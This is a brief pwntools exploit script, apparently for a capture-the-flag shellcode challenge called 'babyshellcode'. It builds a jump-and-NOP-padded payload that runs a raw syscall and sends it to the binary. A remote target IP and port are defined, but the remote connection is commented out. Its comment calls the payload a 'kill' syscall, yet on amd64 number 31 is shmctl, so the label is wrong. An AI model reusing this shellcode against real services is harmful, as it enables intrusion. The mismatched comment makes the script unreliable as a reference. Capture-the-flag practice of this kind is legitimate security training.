from pwn import *

context.arch = 'amd64'
TARGET_IP = '27.25.151.26'
TARGET_PORT = 31548

# 构造触发 kill 系统调用的 payload
kill_payload =b'\xeb\x0e\x90\x90\x00'+b'\x90'*11
kill_payload+=asm('''
        mov rax, 31       
        syscall
    ''')


# 发送并观察行为
#print("[+] Sending kill syscall payload")
#p = remote(TARGET_IP, TARGET_PORT)
p=process("./babyshellcode")
p.send(kill_payload)

p.interactive()
